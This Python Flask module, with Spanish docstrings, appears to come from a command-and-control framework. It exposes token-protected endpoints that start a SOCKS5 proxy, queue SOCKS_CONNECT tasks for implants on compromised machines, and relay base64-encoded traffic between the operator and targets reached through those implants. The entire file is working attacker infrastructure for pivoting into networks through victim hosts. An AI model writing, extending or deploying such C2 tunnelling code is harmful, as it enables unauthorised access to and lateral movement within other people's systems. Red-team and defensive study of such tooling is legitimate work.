"""Endpoints HTTP para el servicio SOCKS5 proxy.

Incluye:
  - POST /socks/start  - Iniciar servidor SOCKS5
  - POST /socks/stop   - Detener servidor SOCKS5
  - GET  /socks/status - Estado del servidor
  - GET  /socks/channels - Listar canales activos
  - POST /socks/connect - Crear canal SOCKS a un target (operador -> implant)
  - GET  /socks/data/<channel_id>  - Implant consulta datos pendientes
  - POST /socks/data/<channel_id>  - Implant envía datos recibidos del target
"""
import base64
import logging

from flask import Blueprint, jsonify, request

from models import require_token, store
from socks import socks_server

log = logging.getLogger("c2.socks")

socks_api = Blueprint("socks_api", __name__)


@socks_api.route("/socks/start", methods=["POST"])
@require_token
def start_socks():
    """Inicia el servidor SOCKS5 local."""
    data = request.get_json(silent=True) or {}
    host = data.get("host", "127.0.0.1")
    port = data.get("port", 1080)

    try:
        socks_server.host = host
        socks_server.port = port
        socks_server.start()
        log.info("SOCKS5 server started on %s:%s", host, port)
        return jsonify(
            {
                "status": "ok",
                "message": f"SOCKS5 server listening on {host}:{port}",
                "host": host,
                "port": port,
            }
        )
    except Exception as e:
        log.error("Failed to start SOCKS5 server: %s", e)
        return jsonify({"error": str(e)}), 500


@socks_api.route("/socks/stop", methods=["POST"])
@require_token
def stop_socks():
    """Detiene el servidor SOCKS5."""
    try:
        socks_server.stop()
        log.info("SOCKS5 server stopped")
        return jsonify({"status": "ok", "message": "SOCKS5 server stopped"})
    except Exception as e:
        log.error("Failed to stop SOCKS5 server: %s", e)
        return jsonify({"error": str(e)}), 500


@socks_api.route("/socks/status", methods=["GET"])
@require_token
def socks_status():
    """Devuelve el estado del servidor SOCKS5."""
    return jsonify(
        {
            "running": socks_server.running,
            "host": socks_server.host,
            "port": socks_server.port,
            "channels": len(socks_server.channels),
            "channel_list": list(socks_server.channels.keys()),
        }
    )


@socks_api.route("/socks/channels", methods=["GET"])
@require_token
def list_channels():
    """Lista los canales SOCKS activos."""
    channels = []
    for channel_id, channel in socks_server.channels.items():
        channels.append(
            {
                "channel_id": channel_id,
                "target": channel["target"],
                "connected": channel["connected"],
                "created": channel["created"],
                "pending_outbound": channel["send_queue"].qsize(),
                "pending_inbound": channel["recv_buffer"].qsize(),
            }
        )
    return jsonify({"channels": channels})


@socks_api.route("/socks/connect", methods=["POST"])
@require_token
def socks_connect():
    """Operador crea un canal SOCKS hacia un target.

    Crea un task tipo SOCKS_CONNECT para que el implant abra la conexión
    al target remoto. Devuelve el channel_id para uso posterior.
    """
    data = request.get_json(silent=True) or {}
    agent_id = data.get("agent_id")
    target_host = data.get("target_host")
    target_port = data.get("target_port")

    if not agent_id or not target_host or not target_port:
        return (
            jsonify({"error": "agent_id, target_host, target_port required"}),
            400,
        )

    # Verificar que el agent existe
    if agent_id not in store.agents:
        return jsonify({"error": "unknown agent"}), 404

    # Crear channel_id
    import time

    channel_id = f"socks_{int(time.time() * 1000)}"

    # Pre-crear el canal en el servidor SOCKS con colas vacías
    from queue import Queue

    with socks_server.lock:
        socks_server.channels[channel_id] = {
            "client_socket": None,  # Se asigna cuando el operador se conecta via SOCKS5
            "target": f"{target_host}:{target_port}",
            "target_host": target_host,
            "target_port": int(target_port),
            "send_queue": Queue(),
            "recv_buffer": Queue(),
            "connected": False,
            "created": time.time(),
        }

    # Encolar tarea para el implant
    command = f"SOCKS_CONNECT {channel_id} {target_host} {target_port}"
    task = store.add_task(agent_id, command)
    if task is None:
        with socks_server.lock:
            if channel_id in socks_server.channels:
                del socks_server.channels[channel_id]
        return jsonify({"error": "failed to enqueue task"}), 500

    log.info(
        "SOCKS_CONNECT requested: agent=%s target=%s:%s channel=%s",
        agent_id,
        target_host,
        target_port,
        channel_id,
    )

    return (
        jsonify(
            {
                "status": "ok",
                "channel_id": channel_id,
                "task_id": task["task_id"],
                "target": f"{target_host}:{target_port}",
            }
        ),
        201,
    )


@socks_api.route("/socks/data/<channel_id>", methods=["GET"])
@require_token
def get_socks_data(channel_id):
    """Implant consulta datos pendientes del send_queue (operator -> target).

    Returns:
        JSON con campo "data" en base64, o HTTP 204 si no hay datos.
    """
    data = socks_server.get_pending_data(channel_id)
    if data is None:
        return jsonify({"data": None}), 204
    encoded = base64.b64encode(data).decode("ascii")
    return jsonify({"data": encoded})


@socks_api.route("/socks/data/<channel_id>", methods=["POST"])
@require_token
def post_socks_data(channel_id):
    """Implant envía datos recibidos del target (target -> operator).

    Body: {"data": "<base64_encoded_bytes>"}
    """
    body = request.get_json(silent=True) or {}
    raw = body.get("data")
    if not raw:
        return jsonify({"error": "data field required (base64)"}), 400

    try:
        decoded = base64.b64decode(raw)
    except Exception:
        return jsonify({"error": "invalid base64 data"}), 400

    socks_server.push_data_from_implant(channel_id, decoded)
    return jsonify({"status": "ok", "bytes": len(decoded)})


@socks_api.route("/socks/connected/<channel_id>", methods=["POST"])
@require_token
def socks_connected(channel_id):
    """Implant reporta que la conexión al target fue exitosa."""
    socks_server.mark_connected(channel_id)
    log.info("SOCKS5 channel %s connected to target", channel_id)
    return jsonify({"status": "ok"})
